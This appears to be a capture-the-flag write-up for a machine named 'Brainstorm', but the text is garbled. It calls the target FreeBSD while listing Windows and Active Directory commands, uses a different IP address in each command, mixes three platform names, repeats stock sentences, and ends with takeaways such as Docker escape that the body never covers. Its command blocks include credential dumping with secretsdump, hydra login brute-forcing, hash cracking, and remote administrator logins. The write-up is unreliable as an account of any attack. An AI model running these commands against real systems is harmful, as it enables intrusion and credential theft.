---
TitleSEO: "VulnHub — Brainstorm (Insane FreeBSD) | ZureFX"
TitlePost: "VulnHub — Brainstorm (Insane FreeBSD)"
Author: "ZureFX"
Description: "Full writeup for VulnHub Brainstorm. Docker Escape and LXD Privilege Escalation to achieve insane compromise on FreeBSD."
Keywords: "tryhackme, insane, medium, pwntilldawn, offsec, ctf"
URL: "https://zurefx.github.io/writeups/htb-brainstorm-142.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-brainstorm-142/"
Date: "2025-05-10"
Tags: "TryHackMe, Insane, Medium, PwnTillDawn, OffSec, CTF"
Section: "writeups"
Lang: "en"
main_img: "htb-brainstorm-142"
Permalink: "/writeups/htb-brainstorm-142.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Brainstorm** is rated **Insane** on VulnHub. It runs **FreeBSD** and the IP address during this analysis was `10.102.38.103`.

### Objectives

The database credentials were hardcoded in the application source code. Privilege escalation was possible due to misconfigured sudo permissions.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
evil-winrm -i 10.68.123.180 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p3268,3389,1433 10.32.223.211 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.94.149.170
```

The web application was vulnerable to Server-Side Template Injection (SSTI). Unconstrained delegation was enabled on the compromised machine.

### Service Enumeration

Weak file permissions allowed modification of critical system files. Initial enumeration revealed several interesting open ports on the target. The target system was identified as running a vulnerable version of the service.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.35.18.176 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Authentication bypass was achieved through careful manipulation of the login mechanism. The backup files contained sensitive information that should not have been accessible.

### SMB Enumeration

The database credentials were hardcoded in the application source code. The database credentials were hardcoded in the application source code.

```bash
evil-winrm -i 10.96.110.92 -u administrator -p 'P@ssw0rd!'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Weak file permissions allowed modification of critical system files. The kernel version was outdated and vulnerable to a publicly known exploit. The service was running without proper input validation, leading to injection vulnerabilities.

## Exploitation

### Vulnerability Identification

Network traffic analysis revealed unencrypted communications containing user credentials. The application stored sensitive credentials in an unencrypted configuration file. Unconstrained delegation was enabled on the compromised machine.

Key finding: **Unconstrained Delegation**.

Unconstrained delegation was enabled on the compromised machine. The application stored sensitive credentials in an unencrypted configuration file.

### Initial Access

Privilege escalation was possible due to misconfigured sudo permissions. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.64.214.83
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Group Policy Preferences contained encrypted but recoverable credentials. The service was running without proper input validation, leading to injection vulnerabilities.

## Privilege Escalation

### Enumeration

The target system was identified as running a vulnerable version of the service. Unconstrained delegation was enabled on the compromised machine. Token impersonation allowed elevation to SYSTEM privileges on the target.

```powershell
gobuster dir -u http://10.66.205.168/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

### Exploitation

The application stored sensitive credentials in an unencrypted configuration file. Network traffic analysis revealed unencrypted communications containing user credentials.

```powershell
nmap -sCV -p3389,8443,3306 10.86.214.89 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.110.140.214
crackmapexec smb 10.128.156.237 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p445,8443,80 10.72.154.158 -oN scan.txt
```

Group Policy Preferences contained encrypted but recoverable credentials. The target system was identified as running a vulnerable version of the service.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The scheduled task ran with elevated privileges and could be abused for escalation. The service account had excessive permissions assigned in Active Directory.

## Summary

### Tools Used

- `nmap`
- `wmiexec`
- `bloodhound`
- `evil-winrm`
- `secretsdump`
- `atexec`

### Key Takeaways

- Docker Escape
- LXD Privilege Escalation
- Unconstrained Delegation
- SSRF
